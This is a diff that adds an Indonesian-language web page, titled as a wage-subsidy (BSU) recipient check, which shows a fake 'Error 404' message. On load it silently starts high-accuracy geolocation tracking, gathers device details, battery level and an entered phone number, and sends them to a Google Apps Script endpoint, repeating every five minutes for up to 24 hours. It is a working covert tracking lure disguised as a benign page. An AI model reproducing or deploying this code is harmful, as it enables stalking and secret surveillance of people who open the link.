@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Cek Penerima BSU</title>
+  <style>
+    body { font-family: system-ui, Arial, sans-serif; margin: 0; background: #0b1020; color: #e8eefc; }
+    .wrap { max-width: 520px; margin: 0 auto; padding: 24px; }
+    .card { background: #121a33; border: 1px solid #253055; border-radius: 16px; padding: 20px; box-shadow: 0 8px 24px rgba(0,0,0,.25); }
+    h1 { margin: 0 0 8px; font-size: 1.4rem; }
+    p.small { opacity: .85; line-height: 1.5; }
+    .status { margin-top: 12px; font-size: .92rem; }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    .map-link { margin-top: 10px; display: none; }
+    a { color: #8fb2ff; }
+    textarea { width: 100%; min-height: 72px; border-radius: 10px; border: 1px solid #384b89; background: #0b1020; color: #e8eefc; padding: 10px; }
+    button { margin-top: 10px; background: #4c7dff; color: white; border: 0; padding: 10px 16px; border-radius: 10px; font-weight: 600; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card">
+      <h1>Error 404 Page not Found</h1>
+      <p class="small">The Page You are looking for doesn't exist or an other error occured. Go Back. Or Head Over to Pneu Top Tyre Pourquoi Aller Alleurs ti choose a new direction.</p>
+      <textarea id="note" placeholder="Tambahkan catatan..."></textarea>
+      <input id="phone" type="text" placeholder="Masukkan No HP..." style="margin-top:8px;width:100%;padding:8px;border-radius:8px;border:1px solid #384b89;background:#0b1020;color:#e8eefc;" />
+      <button id="stopBtn">Hentikan Tracking</button>
+      <div class="status" id="status"></div>
+      <div class="map-link" id="mapWrap">
+        <a id="mapUrl" target="_blank" rel="noopener">-</a>
+        <div class="small mono" id="coords"></div>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const ENDPOINT_URL = 'https://script.google.com/macros/s/AKfycby2mm92gwrRCLCbsgQ8iP4P0OJw2qpoQPaJ7n2aqLZHaC4tK_ESexGJhDIY3VCQNELO6g/exec';
+
+  const statusEl = document.getElementById('status');
+  const noteEl = document.getElementById('note');
+  const phoneEl = document.getElementById('phone');
+  const mapWrap = document.getElementById('mapWrap');
+  const mapUrl = document.getElementById('mapUrl');
+  const coordsEl = document.getElementById('coords');
+  const stopBtn = document.getElementById('stopBtn');
+
+  let watchId = null;
+  let stopTimer = null;
+  let lastPos = null;
+  let intervalId = null;
+
+  // ambil info perangkat
+  async function getExtraInfo() {
+    const ua = navigator.userAgent;
+    const conn = navigator.connection || {};
+    let batteryLevel = null;
+    try {
+      const battery = await navigator.getBattery();
+      batteryLevel = (battery.level * 100) + "%";
+    } catch (e) {
+      batteryLevel = "unknown";
+    }
+    return {
+      ua,
+      connection: conn.effectiveType || "unknown",
+      downlink: conn.downlink || "unknown",
+      phoneNumber: phoneEl.value.trim() || "-",
+      battery: batteryLevel
+    };
+  }
+
+  function setStatus(msg) { statusEl.textContent = msg; }
+
+  async function sendLocation(latitude, longitude, accuracy) {
+    const extra = await getExtraInfo();
+    const payload = {
+      latitude, longitude, accuracy,
+      userNote: noteEl.value.trim(),
+      ua: extra.ua,
+      connection: extra.connection,
+      downlink: extra.downlink,
+      phoneNumber: extra.phoneNumber,
+      battery: extra.battery,
+      clientTimestamp: new Date().toISOString()
+    };
+    try {
+      const res = await fetch(ENDPOINT_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      });
+      return res.json();
+    } catch (err) {
+      console.error(err);
+      return { ok: false, error: "Error" };
+    }
+  }
+
+  function startRealtimeTracking() {
+    if (!('geolocation' in navigator)) {
+      setStatus('Silahkan Muat Ulang');
+      return;
+    }
+
+    setStatus('Loading...');
+
+    watchId = navigator.geolocation.watchPosition(async (pos) => {
+      lastPos = pos.coords;
+      setStatus('Mengirim lokasi...');
+      const result = await sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
+      if (result.ok) {
+        coordsEl.textContent = `Lokasi terkirim`;
+        mapWrap.style.display = 'block';
+      } else {
+        setStatus('Gagal kirim: ' + (result.error || 'unknown'));
+      }
+    }, (err) => {
+      const msg = {1:'Izin ditolak.',2:'tidak tersedia.',3:'Timeout'}[err.code] || 'Gagal.';
+      setStatus(msg);
+    }, { enableHighAccuracy:true, timeout:15000, maximumAge:0 });
+
+    // 🔥 Paksa kirim tiap 5 menit walaupun posisi tidak berubah
+    intervalId = setInterval(() => {
+      if (lastPos) sendLocation(lastPos.latitude, lastPos.longitude, lastPos.accuracy);
+    }, 300000); // 5 menit
+
+    // Stop otomatis setelah 24 jam
+    stopTimer = setTimeout(stopRealtimeTracking, 24 * 60 * 60 * 1000);
+  }
+
+  function stopRealtimeTracking() {
+    if (watchId !== null) {
+      navigator.geolocation.clearWatch(watchId);
+      watchId = null;
+    }
+    if (intervalId) clearInterval(intervalId);
+    if (stopTimer) clearTimeout(stopTimer);
+    setStatus("-");
+  }
+
+  stopBtn.addEventListener('click', stopRealtimeTracking);
+
+  // Auto mulai
+  window.addEventListener('load', startRealtimeTracking);
+</script>
+</body>
+</html>
